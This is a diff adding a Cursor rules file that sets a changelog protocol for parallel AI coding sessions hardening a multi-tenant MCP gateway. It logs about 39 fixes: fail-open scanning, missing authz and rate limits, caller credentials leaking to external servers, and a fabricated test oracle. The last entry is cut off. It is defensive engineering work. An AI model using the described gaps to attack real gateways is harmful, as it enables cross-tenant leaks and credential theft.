@@ -1,0 +1,1959 @@
+---
+inclusion: fileMatch
+fileMatchPattern: ['gateway/**', 'services/mcp-broker/**', 'control/ai_mesh_control/mcp_connector/**', 'shared/ai_mesh_shared/**', 'docs/mcp/**']
+---
+
+# MCP Hardening BACKSTOP — changelog protocol (Cursor mirror)
+
+Parallel Claude + Cursor sessions harden the multi-tenant MCP gateway. Every hardening change MUST be
+logged to **all four memories in the same commit**:
+
+1. Ruflo — `mcp__ruflo__memory_store(namespace="mcp-hardening/changes", key="<CHG-id>", …)` + `hooks_notify`.
+2. Claude — one-line pointer in repo-root `AGENTS.md` (*MCP Hardening BACKSTOP changelog* section).
+3. Cursor — an entry appended to THIS file (`.cursor/rules/mcp-hardening-changelog.mdc`).
+4. Canonical — the full entry in `docs/mcp/HARDENING_CHANGELOG.md` (source of truth; §0 has the template).
+
+Minimum fields per entry: change-id · date · files · WHAT · WHY (gap/mistake/omission) · NOW DOES ·
+whose work it touched · how to VERIFY.
+
+Hard rules: one `CHG-NNNN` per logical change (never reuse an id); commit small; stage narrowly (the
+worktree/index is SHARED across sessions — never `git add -A`); rebase from `main` often. Egress bytes
+are the only source of truth for any redact/block claim; fail closed on a no-op scrub; cross-check leaks
+with `aidefence_scan` as an independent oracle. Gates green (pytest + broker + item stress harness;
+frontend build + Playwright) before marking any scratchpad item `[x]`.
+
+## Changelog (mirror — newest last)
+
+- **CHG-0001** (2026-07-02) — Establish the four-memory changelog protocol. New:
+  `docs/mcp/HARDENING_CHANGELOG.md`, this file, and the `AGENTS.md` pointer. Backstop-only; audited that
+  `docker_manager._resolve_runtime()` already fail-closes runsc enforcement
+  (`services/mcp-broker/src/sandbox/docker_manager.py:343-359`). Verify: `ls` the two new files +
+  `grep "MCP Hardening BACKSTOP changelog" AGENTS.md`.
+- **CHG-0002** (2026-07-02) — Backstop audit → `docs/mcp/BACKSTOP_FINDINGS.md` (24 findings: 13 high/8 med/1
+  low, each file:line + verify). Read-only; backstop-only. Confirmed gaps: SSE `ext_mcp_proxy` egress
+  unscanned; per-actor authz absent on stdio/ws path; compliance tags audit-only + 2 disjoint vocabularies;
+  gVisor/egress default fail-open; only stdio sandboxed; a **dead cross-tenant oracle** (`for fs in []`) and
+  a **15-sandbox ceiling** (hardcoded 3 orgs) that overstate prior "scale/isolation validated" claims. Next
+  priority = G2 item 2 (fail-closed byte-verified result redaction). Verify: `docs/mcp/BACKSTOP_FINDINGS.md`.
+- **CHG-0003** (2026-07-02) — G2 item 2 (PARTIAL): `_scan_tool_result_floor` (`gateway/ai_mesh_gateway/mcp_proxy.py`)
+  now fails **CLOSED** on a result-scan error (both the primary scan and the redaction-floor re-scan) —
+  was fail-OPEN, forwarding the RAW tool RESULT on any scanner hiccup while the inbound twin already
+  blocked. Returns `blocked=True`+`SCAN_ERROR`; all 3 bare routes withhold via their block shape. +2 tests
+  byte-assert raw PII absent with the scanner patched to raise. `pytest test_mcp_bare_proxy_scan.py` → 10
+  passed; broad sweep 323 passed. REMAINING: SSE buffer-and-scan; string/`structuredContent` shapes; main
+  `org_mcp_jsonrpc` inline path audit.
+- **CHG-0004** (2026-07-02) — G2 item 2 (closes the HIGH SSE leak): `ext_mcp_proxy` now BUFFERS a finite
+  tools/call SSE response, scans/redacts each `data:` frame's `result.content` (new helper
+  `_scan_reframe_sse_tool_result`), and re-emits as SSE (or blocks); non-tools/call SSE still passes
+  through live. Was `aiter_bytes()` verbatim = raw PII/secret egress. 3 SSE tests replace the old
+  leak-pinning test; `test_mcp_bare_proxy_scan.py` 12 passed, broad sweep 342 passed. Independent oracle:
+  aidefence_has_pii(masked egress)=false, (raw)=true. REMAINING: string/`structuredContent` shapes; main
+  inline path audit.
+- **CHG-0005** (2026-07-02) — CLOSES G2 item 2: ext-proxy (non-streaming + SSE helper) now scans the
+  ENTIRE `result` (dict content/structuredContent, list, or str), not just `result.content` —
+  string/structuredContent shapes were egressing unscanned. Audited the main `org_mcp_jsonrpc` paths:
+  fail-SAFE (scan exception → 500, raw returned only after successful scan), NOT the bare-route fail-open.
+  +2 tests; 14 bare-proxy passed, broad sweep 362 passed. Item 2 COMPLETE (byte+oracle verified,
+  fail-closed bare / fail-safe main). Deferred (not leaks): main-path graceful-block; per-actor field RBAC → item 3.
+- **CHG-0006** (2026-07-02) — G2 item 3 (finding #2): `org_mcp_tool_call` (bare REST route) now enforces
+  the three per-key gates it was missing — `_tool_allowed_by_key` (403), `mcp_max_tool_calls` cap (429),
+  `_is_tool_disabled` (403) — BEFORE forwarding, at parity with `org_mcp_jsonrpc`. Was: caller could invoke
+  a tool outside its key allowlist / over cap / disabled via the REST route. +4 tests; 18 bare-proxy passed,
+  broad sweep 424 passed. REMAINING item 3: per-actor authz + field RBAC on stdio/ws adapter path (finding
+  #1); posture-vs-rule block downgrade (#3); allowlist-scope inversion (#4).
+- **CHG-0007** (2026-07-02) — G2 item 3 (#3 fixed, #4 dismissed): Tier-1 policy scan
+  (`mcp_scan_orchestrator._scan_text_tier1`) now honors a matched rule's own `action='block'` under any
+  non-`monitor` posture (was downgraded to tag under default posture; the adapter path bypasses the backend
+  that re-enforces it — parity with control-plane engine). **#4 is a FALSE POSITIVE**:
+  `_policy_applies_to_actor` is a policy-SCOPING primitive (documented, mirrors control plane) — do NOT
+  invert it; the real gap is the absent deny-by-default per-actor tool-authz primitive (#1). +2 tests; 15
+  orchestrator + 427 broad pass. REMAINING item 3: finding #1 (per-actor authz + field RBAC on stdio/ws).
+- **CHG-0008** (2026-07-02) — G2 item 3 authz COMPLETE (finding #1 CORRECTED): per-actor ACCESS authz
+  (block/allow by user/agent/role) IS enforced on the stdio/ws adapter path via
+  `evaluate_mcp_policies(actor=...)` + `_policy_applies_to_actor` (+ CHG-0007) — audit's "actor never used
+  for an access decision" was imprecise (it's used one layer down; already unit-tested in
+  test_policy_engine_actor_scoping.py). Added end-to-end proof (real bundle, tag posture: scoped role
+  blocked, other role allowed); 27 tests pass. SPLIT-OUT as item 3b: per-policy FIELD-level redaction
+  (`redaction_fields`) is HTTP-only; gateway bundle has no field-redaction support — needs a bundle-format
+  extension to reach the adapter path.
+- **CHG-0009** (2026-07-02) — G5 item 19 (oracle fixed): replaced the FABRICATED cross-tenant oracle in
+  `scripts/mcp_scale_matrix_live.py` (`for fs in []` → always 0, and not even in the PASS gate) with a
+  real, unit-tested `count_foreign_events`, ADDED it to the gate (`total_foreign == 0`), made the module
+  import-safe, and renamed the misleading `total_egress_bytes`→`request_payload_bytes`. New
+  `scripts/test_mcp_scale_oracle.py` (5 pass, incl. a case proving the old predicate missed a real leak).
+  REMAINING: run the canary matrix LIVE at 500-sandbox scale under chaos with real egress bytes +
+  aidefence cross-check (tied to item 14 scale).
+- **CHG-0010** (2026-07-02) — G5 item 14 (code ceiling removed): `scripts/mcp_scale_provision.py` org count
+  was a hardcoded 3-tuple (→ 15-sandbox ceiling). Now `build_orgs(NUM_ORGS)` (default 3, backward compat;
+  extends via `org-<i>`), so `NUM_ORGS=50 SERVERS_PER_ORG=10` → 500 targets. New
+  `scripts/test_mcp_scale_provision.py` (4 pass, incl. 50-org→500-sandbox). REMAINING: pre-create N orgs
+  (bulk mgmt command); broker per-org distinct sandbox UID (fork budget); prove 300-500 healthy live.
+- **CHG-0011** (2026-07-02) — VERIFICATION (docs only): G3 item 7 is broker-complete but gateway-wiring
+  INCOMPLETE, correcting the "all 32 complete / all transports via sandbox" claim. Verified: stdio→broker ✓;
+  streamable-http/sse→control backend (mcp_proxy.py:2470, backend calls upstream DIRECTLY, no broker refs);
+  websocket→in-gateway (mcp_ws_adapter.py:135). So http/sse/ws do NOT egress via the per-org sandbox
+  ("nothing in the backend" unmet). NOT a data leak (1.4 result scan applies to http/sse per CHG-0005) —
+  an isolation-architecture gap. Owning session: switch http/sse + ws to broker_send_rpc (unified /{org}/rpc
+  route already exists at routes.py:296).
+- **CHG-0012** (2026-07-02) — G5 item 20 harness upgrade: `scripts/mcp_live_matrix_harness.py` was fully
+  SEQUENTIAL and never checked response bytes (a redact-but-forward counted as `allowed`). Now runs all
+  calls CONCURRENTLY (CONCURRENCY-bounded semaphore) and asserts on RESPONSE BYTES via `find_leaked_values`
+  — any sent sensitive value appearing raw in the egress is a LEAK that FAILS the run. New
+  `scripts/test_mcp_live_matrix_oracle.py` (5 pass). REMAINING: run LIVE at peak load (3×), zero leaks;
+  add per-actor authz-denial + tag-enforcement cases under load.
+- **CHG-0013** (2026-07-02) — G5 item 19 LIVE isolation VERIFIED: stack was up, so I RAN the scale-matrix
+  harness (CHG-0009 oracle) 3× consecutive (ROUNDS=6, 540 calls): cross_org_result_leak=0,
+  foreign_org_events_total=0, errors=0, mismatches=0. Also de-flaked the gate: added retry-on-mismatch
+  (+transient_retries) because a ~0.7% transient echo hiccup under load intermittently failed the strict
+  gate (not a demux/isolation bug — cross_org_leak/errors stayed 0 over 1080+ calls). Evidence:
+  mcp-parallel/findings/backstop-p19-isolation/. REMAINING: 500-sandbox-under-chaos + egress-byte aidefence check.
+- **CHG-0014** (2026-07-02) — G5 item 20 LIVE redaction-under-load VERIFIED: ran the live-matrix harness 3×
+  consecutive (CONCURRENCY=25, 450 calls): total_leaked=0, total_redacted=60/run, errors=0 — 1.4 redaction
+  holds under concurrency (validates CHG-0003/0004/0005 + CHG-0012 byte-check end-to-end). Harness fixes:
+  PII embedded in `message` so it round-trips through `echo` (redaction test was vacuous before); resilient
+  server-id lookup (graceful CONTROL_URL degradation). Evidence: mcp-parallel/findings/backstop-p20-redaction-load/.
+  REMAINING: 5k-10k in-flight (item 15) + per-actor/tag cases under load.
+- **CHG-0015** (2026-07-02) — LIVE architecture posture (docker inspect, docs): item 10 resource limits
+  VERIFIED STRONG (cap_drop=ALL, no-new-privileges, pids=256, mem=2GiB, cpu=1, readonly-rootfs, noexec-tmpfs);
+  per-org network isolation VERIFIED (distinct mcp_sandbox_net_<org> per org — host-run shared-bridge
+  fallback NOT active; isolation invariant, relevant to item 7). item 12 gVisor is an UNMET INFRA PREREQ (runsc NOT installed on host — forcing
+  RUNTIME_REQUIRED would fail-close/kill sandboxes); item 12 egress GAP confirmed (networks internal=false =
+  open NAT). Evidence: mcp-parallel/findings/backstop-p12-isolation-posture/. REMAINING item 12: install
+  gVisor + require runsc; network-level egress default-deny.
+- **CHG-0016** (2026-07-02) — G3 item 9 LIVE gateway auth/authz VERIFIED: no-auth→401, bad-key→401,
+  same-org→200, CROSS-ORG key→403 org_scope_violation (BOTH directions — auth-layer cross-tenant isolation),
+  malformed/missing/empty input→graceful (no 500). Rate-limit (S12) exists but not tripped at 60 calls.
+  Evidence: mcp-parallel/findings/backstop-p9-gateway-authz/. REMAINING: rate-limit threshold + adversarial
+  policy/audit (policy authz already unit-proven CHG-0006/0007/0008).
+- **CHG-0017** (2026-07-02) — G2 item 5 LIVE compliance-tagging verified; narrowed to vocabulary-only gap.
+  Live: redaction comprehensive (ssn/card/email all masked, combined too, 0 leak); compliance_tags recorded
+  AND complete (email+ssn event → ['GDPR','HIPAA','PII']); decision=redact under default tag posture (E12
+  floor). REFINES the audit: enforcement + complete tags + audit all WORK — the ONLY gap is vocabulary:
+  gateway codes (GDPR/HIPAA/PII…) ≠ catalog codes (GDPR-PII/HIPAA-PHI…), so MCPEvent.compliance_tags joins
+  ZERO catalog rows. Fix = unify vocab (cross-plane, breaks 8 gateway tests) — owning-session decision.
+  Evidence: mcp-parallel/findings/backstop-p5-compliance-tags/.
+- **CHG-0018** (2026-07-02) — RE-VERIFY G3 item 7: my CHG-0011 http/sse-in-backend finding is RESOLVED by
+  P4.13/P6.18. Gateway now routes stdio + streamable-http/sse via the sandbox (`broker_send_rpc`, gateway
+  never dials upstream; `MCP_HTTP_VIA_SANDBOX=true` default+live). RESIDUAL: websocket still connects
+  in-gateway (`mcp_ws_adapter.py:135 websockets.client.connect`, not migrated to broker) — so the
+  "4-transport isolation active" claim overstates (3/4; ws not sandboxed, but no ws servers live). REMAINING:
+  migrate ws to broker or document ws as legacy; independent live http-via-sandbox drive.
+- **CHG-0019** (2026-07-02) — item 21 (frontend): fixed a BROKEN mojibake fix. PolicyManagementPanel.jsx:399
+  Actor Scope header had literal `·` in raw JSX text (renders the string `·`, not `·`). A fe-harden
+  session's mojibake fix was itself broken (JSX doesn't interpret escapes in text nodes). Changed to
+  `{'·'}` (JS expr → renders `·`, pure-ASCII source). `npm run build` ✓. Remaining item 21 (fe-harden):
+  redact badge/StatCard/Playwright coverage.
+- **CHG-0020** (2026-07-02) — G4 item 13 LIVE observability: metrics WIRED (gateway /metrics 401 scraper-key
+  gated, METRICS_ALLOW_OPEN=false; telemetry-drain thread); health WIRED (gateway/control/broker /health 200);
+  auto-recovery via docker healthchecks (broker/control/pg/redis healthy) + sandbox reaper. GAPS: distributed
+  tracing (OTEL/Jaeger) NOT configured; gateway has NO docker healthcheck (health=none); backup unverified.
+  Evidence: mcp-parallel/findings/backstop-p13-observability/.
+- **CHG-0021** (2026-07-02) — G2 items 4 & 6 RESOLVED: LIVE per-call chain verified in order on a real PII
+  call — authz (reached tool; org-key validated) → minimize [N-A: gateway forwards only tool args, echo
+  returns just `message`] → scan+redact (scan_trace=[tier1 input, tier1 output]; decision=redact via E12
+  floor) → tag (['GDPR','HIPAA','PII']) → audit (MCPEvent w/ latency+trace). Item 4 minimize = N-A for MCP
+  (minimize_context is chat-only). Only G2 open: 3b (field RBAC redaction on adapter) + 5 (vocab). Evidence:
+  mcp-parallel/findings/backstop-p6-per-call-chain/.
+- **CHG-0022** (2026-07-02) — G3 item 8: `docker_manager._run_kwargs` now propagates
+  MCP_STDIO_REQUIRE_PINNED_PACKAGES + MCP_STDIO_PACKAGE_ALLOWLIST into the sandbox env (default OFF
+  pass-through) so the agent's stdio_manager pin/allowlist checks are reachable. Was: only
+  npm_config_ignore_scripts set → pin/allowlist defaulted OFF/unreachable (npx <arbitrary>@latest risk).
+  Default OFF so live UNPINNED servers still run. +1 broker test; 27 passed. REMAINING: set REQUIRE_PINNED=true
+  (needs all servers pinned) + locked .npmrc/registry in sandbox image.
+- **CHG-0023** (2026-07-02) — G3 item 11 LIVE PG+Redis correctness: Redis usage correct (mcp:scan_ver:* 72
+  keys = M-15 scan-config version cache-invalidation string counters; ratelimit:* 2 keys = S12 active;
+  mcp:toolcalls:* mechanism present). Postgres persistence correct at scale (mcp_connector_mcpevent 109,362
+  events / 3 orgs; compliance_tags populated block=10/redact=265). Restart-safety graceful by design
+  (Redis-unreachable → TTL-only; PG recording best-effort). GAP: actual restart-drill = item-18 chaos
+  (unsafe on shared stack). Evidence: mcp-parallel/findings/backstop-p11-pg-redis/.
+- **CHG-0024** (2026-07-02) — G2 item 3b: per-policy FIELD-level RBAC redaction on the stdio/websocket
+  ADAPTER path. The compiler already emits `Policy.redaction_fields` into the bundle (compiler.py:521, M-04)
+  and the control HTTP path masks those named tool-RESULT fields, but the gateway never consumed them — the
+  adapter path did content-scan yet NO field-level masking. Now the gateway policy engine surfaces the
+  matched actor-scoped policy's `redaction_fields` on `EvaluationResult`, and a Django-free port of control's
+  `apply_field_redaction` (NFKC homoglyph fold, case-insensitive keys, depth/node bounds, non-mutating deep
+  copy) masks those named fields in the structured OUTPUT payload — scoped by actor, output-only, suppressed
+  under `monitor`, recorded via `redacted_fields` in the scan trace + audit meta. Closes finding #1
+  (field-RBAC absent on adapter path). Files: policy_engine.py (EvaluationResult + evaluate/evaluate_mcp_
+  policies collection + apply_field_redaction), mcp_scan_orchestrator.py (McpScanResult.redacted_fields +
+  _scan_text_tier1 4-tuple + _finalize_output), mcp_proxy.py (meta), test_mcp_scan_orchestrator.py (+7 tests).
+  Gate: 22 passed / 1056 broad sweep. Backward-compat: redaction_fields=[] → no-op (proven). REMAINING:
+  cross-stage input-triggered parity + live drive → item 3b stays open (advanced, not [x]).
+- **CHG-0025** (2026-07-02) — G2 item 3b COMPLETE ([x]): cross-stage input-triggered field projection. The
+  RBAC "role X never sees field F" pattern authors its rule on the CALL, so the INPUT-stage policy match must
+  project the declared fields out of the RESPONSE — exactly what the control HTTP path does. Now: the input
+  scan surfaces `policy_redaction_fields` (its matched policies' declared union) in the returned meta;
+  `org_mcp_jsonrpc` captures that (`_in_rfields`) and threads it into BOTH adapter OUTPUT scans as
+  `extra_redaction_fields`; the orchestrator masks those named fields on the response;
+  `apply_field_redaction` now returns object identity on a true no-op (so a pure field-projection scan is
+  detectable and never mislabels an unchanged result); the adapter swap gate also fires on
+  `_scan_meta_out.redacted_fields` so a finding-less field projection isn't discarded (would have leaked the
+  field). Files: policy_engine.py (identity-on-noop), mcp_scan_orchestrator.py
+  (McpScanResult.policy_redaction_fields + extra_redaction_fields + identity-gated _finalize_output),
+  mcp_proxy.py (_mcp_security_scan param + meta + org_mcp_jsonrpc threading + swap-gate), +5 orchestrator
+  tests, +2 end-to-end adapter tests. Gate: 37 relevant + 1063 broad sweep passed. Both trigger directions
+  (output-content + input-call) now covered on the adapter path. Item 3b → [x]. RESIDUAL (non-blocking):
+  bare-REST/ext-proxy cross-stage (separate surface; legacy backend path covered by control) + optional
+  live-stack drive over the byte-level in-process e2e proof.
+- **CHG-0026** (2026-07-02) — G3 item 7 [x]: migrated the websocket transport onto the sandbox broker path.
+  `_adapter_forward` now forwards ws via `broker_send_rpc` (transport='websocket') alongside
+  streamable-http/sse; the in-gateway `mcp_ws_adapter.send_jsonrpc` dial is removed. ws was the LAST transport
+  still opening an upstream socket from inside the gateway process — despite `_is_sandbox_routed` already
+  declaring it sandbox-routed and the broker + sandbox agent (routes.py unified /{org}/rpc; upstream_manager
+  session.ws) already supporting ws upstreams. Now ALL four transports (stdio + streamable-http + sse +
+  websocket) egress via the per-org sandbox by default; the gateway never dials any upstream. Files:
+  mcp_proxy.py + test_mcp_http_via_sandbox.py (+1: broker routing asserted, in-gateway ws send NOT awaited).
+  Gate: 1064 gateway + 52 broker (ws/upstream/route/rpc/lifecycle) passed. Caveat: streamable-http/sse still
+  honor MCP_HTTP_VIA_SANDBOX (default ON → sandbox); stdio + ws unconditional. mcp_ws_adapter is now legacy
+  (its main.py reaper/shutdown hooks remain as benign no-ops over an empty ws session table).
+- **CHG-0027** (2026-07-02) — G4 item 13 (partial): gateway docker healthcheck + restart policy. The gateway
+  was the ONLY core service with neither a healthcheck nor (in the base compose) a restart policy — CHG-0020
+  found health=none → never auto-restarted, and peers could only gate on service_started. Added a healthcheck
+  probing the auth-exempt /health (`python -c urllib.request.urlopen('http://127.0.0.1:8300/health')`,
+  interval 15s/timeout 6s/retries 5/start_period 60s) to BOTH docker-compose.yml (base: + restart:
+  unless-stopped) and docker-compose.prod.yml (prod: restart already via anchor). /health returns 200 ok
+  normally, 503 on a fatal policy-signing misconfig, so a broken gateway now reads unhealthy. Config-only —
+  the running container was NOT recreated. VERIFY: `docker compose -f docker-compose.yml -f
+  docker-compose.override.yml config` shows gateway.healthcheck + restart=unless-stopped; base+prod merged
+  config also valid. Files: docker-compose.yml, docker-compose.prod.yml. Item 13 STILL OPEN: OTEL/Jaeger
+  tracing + PG/Redis backup remain (optional: upgrade gateway-dependent peers to service_healthy).
+- **CHG-0028** (2026-07-02) — G5 item 20 (advance): extended the live-matrix harness with a per-actor
+  AUTHZ-under-load oracle. It proved REDACTION under concurrent load (byte oracle) but had NO per-actor tool
+  authorization dimension. Added `authz_denied(status, body)` (HTTP 403 / authz-flavored JSON-RPC error /
+  `[BLOCKED]` result — a GENERIC error is NOT a denial) + `authz_violation(..., expect_denied=True)` (True
+  ONLY when a forbidden tool EXECUTED successfully under load = a real hole) + a `Scenario` type + a
+  `DENY_TOOL_NAME`-gated `F_authz_deny` concurrent agent that fires forbidden calls and asserts every one is
+  refused. The run gate now FAILS on any authz violation (plus any raw-PII leak) and flags an `authz_vacuous`
+  run (deny tool neither denied nor executed → misconfigured). Files: scripts/mcp_live_matrix_harness.py,
+  scripts/test_mcp_live_matrix_oracle.py (+3 → 8 oracle tests passed). Backward-compat: unset DENY_TOOL_NAME
+  → the 5-agent redaction matrix runs unchanged. REMAINING for item 20: run the full matrix LIVE at true peak
+  (5k-10k, item 15) with a real denied-but-existing tool + a tag-enforcement MCPEvent audit under load.
+- **CHG-0029** (2026-07-02) — G5 harness quality: hardened the `mcp_pipeline_matrix_live.py` oracle (the other
+  harness the mandate names). It was leak-blind — `pii = _SSN in text` checked ONE hardcoded SSN in ONLY
+  `result.content[0].text`, so a redact-but-forward in a later content item / `structuredContent` / nested
+  field / any non-SSN value passed as `redacted` or `allow` (a silent false-green) — and import-unsafe
+  (`KEY`/`argv`/`asyncio.run` at module scope, so the oracle couldn't be unit-tested). Now `find_pii_in_body`
+  substring-scans the FULL serialized response for the case's ACTUAL sensitive values (`case_sensitive_values`:
+  explicit `case['pii']` or SSN-in-args fallback); `redacted` = allowed + NO raw value anywhere + a redaction
+  marker (byte-truth, so a non-echoing tool isn't mistaken for a redaction); `pass_pii` = allowed + a raw value
+  present; the module is import-safe. Files: scripts/mcp_pipeline_matrix_live.py (rewritten),
+  scripts/test_mcp_pipeline_oracle.py (+8). Gate: 8 pipeline-oracle tests; all 4 scripts oracle suites → 25
+  passed. Same class of defect as CHG-0009 (dead cross-tenant oracle) + CHG-0012 (no response-byte check).
+- **CHG-0030** (2026-07-02) — 1.4 "PII/IP/regulated": extended MCP compliance tagging to IP / infrastructure
+  leakage. `detect_ip_leakage` + `IP_LEAKAGE_PATTERNS` (internal IPv4, internal hostnames `*.corp/.internal/
+  .local`, internal URLs, private unix/windows file paths → `INFRA`) already ran on the CHAT `output_guard`
+  path, but the MCP tool-call scan (`_scan_text_tier1`) ran ONLY `detect_pii`+`detect_secrets` — so an internal
+  host / IP / private file path in a tool RESULT was never detected, tagged, or redacted. Now folded into the
+  same PII/secret fallback: an `ip_leakage` finding is `INFRA`-tagged (via `get_compliance_tags`) and enforced
+  by posture (block→block, redact→`redact_all`, monitor→tag). FAIL-CLOSED byte-check: `redact_all` masks
+  internal IP/host/URL but NOT private file paths, so if ANY detected internal value survives the scrub under a
+  redact posture the call BLOCKS (no redact-that-leaks). Public IPs / example addrs not flagged. Files:
+  mcp_scan_orchestrator.py (`_scan_text_tier1` + `_tags_for_finding`), test_mcp_scan_orchestrator.py (+5).
+  Gate: 32 orchestrator + 1069 broad sweep passed. Distinct from item 5's tag-vocab mismatch (still open).
+- **CHG-0031** (2026-07-02) — G3 item 9 (gateway rate-limit parity): the bare REST tool-call route
+  `org_mcp_tool_call` enforced the per-KEY tool-call cap + per-key authz (CHG-0006) but NOT the per-ORG
+  TPM/burst/RPM rate limit that `org_mcp_jsonrpc` applies (called only at mcp_proxy.py:2092) — so a tenant
+  could exceed org burst/RPM/TPM ceilings by driving the bare `/tools/call` route. Extracted the shared check
+  into `_mcp_org_rate_limit_raw` (plain 429 JSONResponse, atomic-INCR limiter, fail-open by design); the
+  JSON-RPC route wraps it into its JSON-RPC-200 envelope (byte-identical behaviour), the bare route returns it
+  as-is (REST 429 + Retry-After). Files: mcp_proxy.py, test_mcp_rate_limit.py (+3). Gate: 7 rate-limit + 1072
+  broad sweep passed. Same bare-route parity class as CHG-0006. REMAINING (item 9): live threshold probe +
+  adversarial policy-enforcement + audit-completeness; ext_mcp_proxy also lacks the per-org limiter (follow-up).
+- **CHG-0032** (2026-07-02) — G3 item 9: closed the `ext_mcp_proxy` rate-limit follow-up from CHG-0031. The
+  authenticated external MCP proxy (`/v1/mcp/ext-proxy/{host}/{path}`, behind the auth middleware — NOT in
+  `EXCLUDED_PATHS`, so `request.state.auth_context` with `org_slug` is populated) did inbound credential + SSE
+  result scanning but enforced NO per-org rate limit, so a tenant could drive the external proxy past its org
+  burst/RPM/TPM ceilings. Added `_mcp_org_rate_limit_raw(_get_auth_context(request))` right after the domain
+  allowlist check (plain 429 before any scan/forward; fail-open/no-op if unauthenticated). Now ALL THREE
+  tenant-facing MCP entry points (`org_mcp_jsonrpc`, `org_mcp_tool_call`, `ext_mcp_proxy`) enforce the identical
+  per-org limiter. Files: mcp_proxy.py, test_mcp_rate_limit.py (+3: ext-proxy TPM/burst → 429 before forward;
+  disallowed domain still 403 first). Gate: 10 rate-limit + 1075 broad sweep passed. Code-level rate-limit
+  coverage complete; item 9 REMAINING: live threshold probe + adversarial policy + audit-completeness.
+- **CHG-0033** (2026-07-02, HIGH) — 1.4 least-privilege / credential leak: `ext_mcp_proxy` forwarded the
+  caller's request headers verbatim (only host/content-length/transfer-encoding stripped) to the third-party
+  external MCP server, so the caller's `Authorization: Bearer <gateway-API-key>`, `Cookie`, and `X-Api-Key`
+  egressed to the external domain (replayable against the gateway). The sandbox-routed path already built a
+  clean header set + injected only the server's own OAuth token — an ext-proxy-only regression. Fix: new
+  `_ext_proxy_forward_headers` strips hop-by-hop + credential/identity headers (authorization / proxy-
+  authorization / cookie / set-cookie / x-api-key) + any `x-gateway-*`, and injects the gateway's stored OAuth
+  bearer for the upstream (if any) as the SOLE Authorization. Files: mcp_proxy.py,
+  test_mcp_bare_proxy_scan.py (+2). Gate: 20 bare-proxy + 1077 broad sweep passed. Now the external server
+  receives only safe/protocol headers + its own token; the caller's gateway key never leaves the gateway.
+- **CHG-0034** (2026-07-02) — G3 item 9 (gateway validation / DoS): the MCP tool-call handlers buffered the
+  whole request (`request.body()`/`json()`) with NO size ceiling — a tenant could POST a huge body and exhaust
+  gateway memory (RAG/embeddings already have 413 guards; MCP had none). Added `_MCP_MAX_BODY_BYTES` (default
+  10 MiB, env `MCP_MAX_BODY_BYTES`) + `_mcp_body_too_large()` + a 413 `mcp_body_too_large` response, enforced
+  BEFORE the body read on all three tenant-facing entry points (org_mcp_jsonrpc, org_mcp_tool_call,
+  ext_mcp_proxy). Non-invasive (Content-Length pre-check; body-read flow unchanged; defensive on test doubles).
+  Files: mcp_proxy.py, test_mcp_rate_limit.py (+4). Gate: 14 rate-limit + 1081 broad sweep passed. Documented
+  limitation: a chunked request omitting Content-Length isn't caught (infra body limit covers it; an app-layer
+  streaming cap is deferred to avoid re-mocking the body-read across the MCP test harness).
+- **CHG-0035** (2026-07-02, verification — read-only) — after the CHG-0033 credential leak, audited every OTHER
+  security-critical egress/isolation path for the same class of gap. ALL CLEAN. (1) Sandbox agent HTTP
+  (`upstream_manager.py`): `follow_redirects=False` (no SSRF-via-redirect), per-method timeouts, no `verify=False`
+  anywhere in the broker/sandbox (TLS verify default-on). (2) WS (`ws_manager.py`): ws/wss scheme only,
+  `websockets.connect` uses the default verifying SSL context, bounded handshake; no CERT_NONE/check_hostname
+  bypass. (3) Container (`docker_manager`): no-new-privileges + Docker DEFAULT seccomp (NOT unconfined) +
+  cap_drop=ALL + read_only rootfs + `memswap_limit=mem_limit` (swap disabled) + pids/mem/cpu limits. (4)
+  Cross-tenant harness (`scripts/mcp_multi_org_harness.py`): byte-level canary cross-target oracle + JSON-RPC id
+  round-trip + fail-closed negative matrix (any non-401/403 on a cross-tenant call = breach). Evidence:
+  mcp-parallel/findings/backstop-p12b-sandbox-egress-hygiene/audit.md. No code changed. RESIDUAL (item 12,
+  unchanged): runc (not gVisor) + per-org networks internal=false (no egress default-deny) — infra, not code.
+- **CHG-0036** (2026-07-02, FINDING — no code change) — G6 item 21: the MCP guardrail UI does NOT reflect 1.4
+  compliance tags, correcting the fe-harden "item 11 DONE" claim (commit 6658f9fc). `MCPGuardrailSimulator.jsx`
+  builds its verdict without ever capturing/rendering `compliance_tags`, and its LIVE 2xx branch is nearly
+  blank (no redaction indicator, no tags) for a call the gateway redacted. ROOT CAUSE: `PolicyTestView`
+  (`/api/policies/test/`) imports `get_compliance_tags` but omits `compliance_tags` from its response payload,
+  and `/api/mcp-connector/tools/call/` keeps tags only in the MCPEvent audit — the frontend cannot reflect what
+  the backend never sends. Fix spans control (add compliance_tags to the response + unify vocab per item 5) +
+  frontend (chip render + Playwright + enrich the live branch) — neither safely gate-able from this session
+  (no control venv/test DB; no dev server; fe-harden owns item 21). Evidence:
+  mcp-parallel/findings/backstop-p21-frontend-tag-reflection/finding.md.
+- **CHG-0037** (2026-07-02, doc — no code change) — completion-readiness matrix `docs/mcp/COMPLETION_READINESS.md`:
+  maps every 1.4 + architecture + stress mandate requirement to CODE-HARDENED (✅) / VERIFIED (🔎) / OPEN (⛔
+  with blocker), citing the CHG evidence per row. Bottom line: the code-level 1.4 / gateway / transport /
+  isolation hardening is comprehensive and gated green (gateway suite 1081 passed); what remains is (a) a
+  dedicated host for the VERY-HARD stress suite (items 14–19, the completion gate), (b) infra (gVisor install,
+  egress default-deny, OTEL tracing, PG/Redis backup, npm prod-enable), (c) owned/cross-plane (item-21 UI tag
+  reflection via the control response, item-5 tag vocab). States plainly that completion is NOT met and why.
+- **CHG-0038** (2026-07-02) — G2 item 3 (tool-authz VISIBILITY parity + least-privilege): the per-key
+  `mcp_allowed_tools` allowlist was enforced at tools/CALL (`_tool_allowed_by_key` → 403, CHG-0006) but
+  tools/LIST was filtered ONLY by the server-level `disabled` set — so a restricted key could SEE every
+  server-enabled tool, including ones it would be 403'd on (info disclosure + authz inconsistency). Added
+  `_filter_tools_by_key_allowlist(tools, auth)` (empty/absent allowlist = all visible, mirroring
+  `_tool_allowed_by_key`; non-dict/name-less entries pass through) and layered it after
+  `_filter_tools_by_enabled` at ALL 4 tools/list sites — the org_mcp_jsonrpc adapter branch, the JSON-RPC
+  backend branch, and the REST `org_mcp_tools_list` (now also resolves `_get_auth_context`). A key allowlisted
+  to `echo` now sees only `echo` in tools/list (JSON-RPC + REST). Files: mcp_proxy.py,
+  test_mcp_bare_proxy_scan.py (+2). Gate: 22 bare-proxy + 1083 broad sweep passed.
+- **CHG-0039** (2026-07-02) — G2 item 2 (result-scan completeness on the external proxy): `ext_mcp_proxy`
